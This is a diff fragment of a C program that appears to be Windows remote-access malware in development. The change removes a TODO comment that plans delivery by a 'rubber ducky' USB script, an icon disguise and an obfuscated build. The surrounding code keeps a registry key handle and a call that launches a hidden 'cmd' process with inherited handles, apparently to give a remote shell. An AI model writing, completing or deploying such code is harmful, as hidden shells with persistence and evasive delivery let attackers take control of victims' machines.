@@ -8,12 +8,7 @@
 #include <string.h>
 #include <unistd.h>
 
-/*
----TODO----
-use ico file
-rubber ducky script //WHY IS THIS SO HARD ((FIND A STORAGE PLACE OR HOST IT))
-OBFUSCATED VERSION
-*/
+
 int main(void) {
 	char cwd[200]; // get directory
 	HKEY hkey;  //key var
@@ -77,4 +72,5 @@ int main(void) {
 	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo); //create cmd process
 
 	return (0);
+
 }
